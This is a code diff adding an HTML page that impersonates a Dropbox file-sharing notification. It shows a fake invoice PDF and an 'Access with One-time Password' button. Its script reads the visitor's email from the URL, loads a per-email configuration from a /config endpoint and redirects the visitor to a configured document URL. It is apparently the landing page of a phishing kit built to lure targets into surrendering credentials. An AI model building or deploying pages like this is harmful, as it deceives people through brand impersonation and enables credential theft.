@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dropbox Notification</title>
+
+    <style>
+        body {
+            background: #f5f6f5;
+            font-family: 'Open Sans', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .notification-card {
+            max-width: 400px;
+            margin: 40px auto;
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 32px;
+            text-align: center;
+            position: relative;
+        }
+
+        .loading-wrapper {
+            position: relative;
+            display: inline-block;
+        }
+
+        .loading-line {
+            width: 0;
+            height: 3px;
+            background: #0061ff;
+            display: none;
+            margin: 10px auto 0;
+            animation: load 1.5s linear infinite;
+        }
+
+        .loading-active .loading-line {
+            display: block;
+        }
+
+        .loading-message {
+            font-size: 0.9em;
+            color: #333333;
+            margin-top: 10px;
+            display: none;
+        }
+
+        .loading-active .loading-message {
+            display: block;
+        }
+
+        @keyframes load {
+            0% {
+                width: 0;
+            }
+
+            50% {
+                width: 100%;
+            }
+
+            100% {
+                width: 0;
+            }
+        }
+
+        .dropbox-logo {
+            width: 128px;
+            margin-bottom: 16px;
+        }
+
+        .title {
+            font-size: 1.5em;
+            font-weight: 600;
+            color: #0061ff;
+            margin-bottom: 12px;
+        }
+
+        .desc {
+            font-size: 1em;
+            color: #333333;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .file-info {
+            background: #f8fafc;
+            border-radius: 6px;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 1em;
+            color: #333333;
+        }
+
+        .filename {
+            font-weight: 600;
+        }
+
+        .filesize {
+            color: #666666;
+            font-size: 0.9em;
+        }
+
+        .action-btn {
+            background: #0061ff;
+            color: #ffffff;
+            font-size: 1em;
+            font-weight: 600;
+            border: none;
+            border-radius: 4px;
+            padding: 12px 36px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        .action-btn:hover {
+            background: #0052cc;
+        }
+
+        .footer {
+            font-size: 0.85em;
+            color: #666666;
+            margin-top: 20px;
+        }
+
+        .footer a {
+            color: #0061ff;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="notification-card" id="notificationCard">
+        <div class="loading-wrapper">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/23/Dropbox_Logo_01.svg" class="dropbox-logo"
+                alt="Dropbox Logo">
+        </div>
+        <div class="title">New Document Received</div>
+        <div class="desc">
+            A new file has been shared with you via Dropbox. You'll be redirected in 5 seconds.
+        </div>
+        <div class="file-info">
+            <span class="filename">Invoice_20210921.pdf</span><br>
+            <span class="filesize">34.7 KB</span>
+        </div>
+        <button class="action-btn" id="action-btn">Access with One-time Password</button>
+        <div class="loading-line"></div>
+        <div class="loading-message" id="loadingMessage">
+            Please wait while we securely open your document
+        </div>
+        <div class="footer">
+            Shared securely by Dropbox · <a href="https://www.dropbox.com">Learn more</a>
+        </div>
+    </div>
+
+    <script>
+
+        function startRedirect(url) {
+            const card = document.getElementById('notificationCard');
+            card.classList.add('loading-active');
+            setTimeout(() => {
+                window.location.href = url;
+            }, 2000);
+        }
+
+        (function () {
+            let lastEmail = null;
+
+            function getEmailFromUrl() {
+                const params = new URLSearchParams(window.location.search);
+                return params.get("email");
+            }
+
+            async function refreshConfig(email) {
+                try {
+                    const res = await fetch(`/config?email=${encodeURIComponent(email)}`);
+                    const cfg = await res.json();
+                    // update restoreBtn
+                    document.getElementById("action-btn").addEventListener("click",evt => startRedirect(cfg.DOCUMENT_URL));
+                } catch (err) {
+                    console.error("Config load failed", err);
+                }
+            }
+
+            function checkForEmailChange() {
+                const email = getEmailFromUrl();
+                console.log(`Checked email and found ${email}`)
+                if (email && email.length > 4 && email !== lastEmail) {
+                    lastEmail = email;
+                    refreshConfig(email);
+                }
+            }
+
+            // Run at page load
+            //checkForEmailChange();
+            refreshConfig('');
+
+            // Watch periodically (since user can manually edit URL bar)
+            setInterval(checkForEmailChange, 3000);
+
+        })();
+
+    </script>
+</body>
+
+</html>
